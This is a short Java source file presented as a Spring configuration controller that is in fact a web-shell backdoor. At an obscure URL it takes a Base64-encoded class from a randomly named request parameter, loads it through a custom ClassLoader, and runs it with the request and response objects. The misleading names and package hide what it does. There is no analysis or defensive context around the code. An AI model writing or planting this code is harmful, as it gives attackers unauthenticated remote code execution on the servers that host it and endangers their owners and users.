package cloud.tianai.crypto.configutation;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.Base64;

@Controller("idm-sh")
public class DM {

    @RequestMapping("/20211206/dm")
    public void dm(HttpServletRequest request, HttpServletResponse response) throws Exception {
        String cls = request.getParameter("G82O9w1z9A91m4wV");
        if (cls != null) {
            new PHYSICAL(this.getClass().getClassLoader()).Turing(resolution(cls)).newInstance().equals(new Object[]{request,response});
        }
    }
    public byte[] resolution(String str) throws Exception {
        return Base64.getDecoder().decode(str);
    }
    class PHYSICAL extends ClassLoader{
        PHYSICAL(ClassLoader c){super(c);}
        public Class Turing(byte[] b){
            return super.defineClass(b, 0, b.length);
        }
    }
}
